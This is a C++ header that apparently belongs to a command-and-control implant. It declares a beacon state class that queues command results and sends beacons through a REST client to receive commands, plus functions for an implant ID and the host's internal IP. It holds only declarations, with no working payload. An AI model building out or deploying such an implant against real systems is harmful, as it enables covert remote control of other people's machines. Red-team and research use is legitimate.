#pragma once

#include "Beacon.hpp"
#include "CommandDAO.hpp"

#include <RESTClient.hpp>
#include <deque>
#include <mutex>
#include <vector>

class BeaconState {
public:
    void add_result(CommandResult result);
    void add_results(std::vector<CommandResult> results);
    void enqueue_chunks(std::vector<CommandResult> chunks);
    [[nodiscard]] std::vector<CommandResult> take_results();

    [[nodiscard]] std::vector<CommandDAO> send_beacon(cpppwn::RESTClient& rest_client);

private:
    std::mutex mtx_;
    std::vector<CommandResult> pending_results_;
    std::deque<CommandResult> chunk_queue_;
};

[[nodiscard]] std::string get_or_create_implant_id();
[[nodiscard]] std::string get_internal_ip();
